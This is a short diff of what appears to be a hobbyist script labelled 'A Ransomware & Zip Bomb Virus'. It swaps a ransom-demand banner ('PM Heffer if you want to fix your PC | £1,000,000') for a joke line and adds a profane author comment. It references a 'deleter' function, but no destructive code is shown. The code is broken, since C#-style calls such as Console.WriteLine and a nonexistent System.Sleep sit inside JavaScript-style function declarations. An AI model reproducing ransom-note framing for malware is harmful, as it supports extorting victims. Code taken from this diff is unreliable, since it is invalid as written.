@@ -43,7 +43,7 @@ function text(){
         Console.WriteLine("+---------------------------------------------------+");
         Console.WriteLine("| A Ransomware & Zip Bomb Virus                     |");
         Console.WriteLine("+---------------------------------------------------+");
-        Console.WriteLine("| PM Heffer if you want to fix your PC | £1,000,000 ");
+        Console.WriteLine("| ooooooooooooooooooooooooooooooooooooooff          ");
         Console.WriteLine("+---------------------------------------------------+");
         System.Sleep(3);
 
@@ -655,6 +655,9 @@ function deleter(){
 
 
 // end
+
+//UPDATE THIS WAS MADE IN MARCH 2020 HOLY SHIT MY SCRIPTING IS BAD, WHY DIDN'T I MAKE A LOOP?? CAUSE IT TAKES AGES TO USE MATH.RANDOM ON 50 CHARACTERS, THE SCRIPT WOULD
+// TAKE LIKE 20 MINUTES TO WORK INSTEAD OF 2 SO DEAL WITH IT THANK YOU.
 
 
 
